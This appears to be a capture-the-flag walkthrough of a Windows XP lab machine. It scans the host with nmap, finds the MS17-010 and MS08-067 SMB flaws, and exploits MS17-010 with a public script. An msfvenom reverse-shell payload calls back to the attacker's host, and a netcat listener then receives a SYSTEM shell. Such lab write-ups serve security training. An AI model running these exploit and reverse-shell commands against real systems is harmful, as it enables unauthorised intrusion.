# IP Address: 10.10.10.4

# Enumeration.1
```
┌──(code㉿kali)-[~]
└─$ sudo nmap -sV -Pn -p- -T 4 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-10 19:00 EST

PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
```

Server is running Windows XP which is known to serve a vulnerable version of SMB by default. 

Vulnerability scan the SMB service with nmap scripts.
```
┌──(code㉿kali)-[~]
└─$ sudo nmap -Pn --script=smb-vuln-* -p 139,445 10.10.10.4 -v                                                                            
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-11 11:41 EST
NSE: Loaded 11 scripts for scanning.

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.

Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)

```

Check for exploits for ms17-010 and MS08-067. Found this exploit repository https://github.com/helviojunior/MS17-010

# Exploitation
Clone repository and generate the reverse shell executable.
```
┌──(code㉿kali)-[~]
└─$ git clone https://github.com/helviojunior/MS17-010.git
Cloning into 'MS17-010'...
remote: Enumerating objects: 202, done.
remote: Total 202 (delta 0), reused 0 (delta 0), pack-reused 202
Receiving objects: 100% (202/202), 118.50 KiB | 763.00 KiB/s, done.
Resolving deltas: 100% (115/115), done.

┌──(code㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f exe > reverse.exe                                               
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

┌──(code㉿kali)-[~]
└─$ cd MS17-010/   

┌──(code㉿kali)-[~/MS17-010]
└─$ python send_and_execute.py 10.10.10.4 ../reverse.exe 445 browser                                                                          
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8209e3f8
SESSION: 0xe218d4f0
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe22b7878
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe22b7918
overwriting token UserAndGroups
Sending file BXLPM2.exe...
Opening SVCManager on 10.10.10.4.....
Creating service ukeA.....
Starting service ukeA.....
The NETBIOS connection with the remote host timed out.
Removing service ukeA.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

On netcat listener:
```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.4] 1031
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>set
set
ALLUSERSPROFILE=C:\Documents and Settings\All Users
CommonProgramFiles=C:\Program Files\Common Files
COMPUTERNAME=LEGACY
ComSpec=C:\WINDOWS\system32\cmd.exe
FP_NO_HOST_CHECK=NO
NUMBER_OF_PROCESSORS=1
OS=Windows_NT
Path=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
PROCESSOR_ARCHITECTURE=x86
PROCESSOR_IDENTIFIER=x86 Family 23 Model 1 Stepping 2, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=0102
ProgramFiles=C:\Program Files
PROMPT=$P$G
SystemDrive=C:
SystemRoot=C:\WINDOWS
TEMP=C:\WINDOWS\TEMP
TMP=C:\WINDOWS\TEMP
USERPROFILE=C:\Documents and Settings\LocalService
windir=C:\WINDOWS
```

Based on the USERPROFILE environment variable, it looks like we have system-level access.

# Enumeration.2

Find user.txt
![user.txt](https://github.com/codetantrum/walkthroughs/blob/master/Lame/images/Pasted%20image%2020211111124708.png)

Find root.txt
![root.txt](https://github.com/codetantrum/walkthroughs/blob/master/Lame/images/Pasted%20image%2020211111124918.png)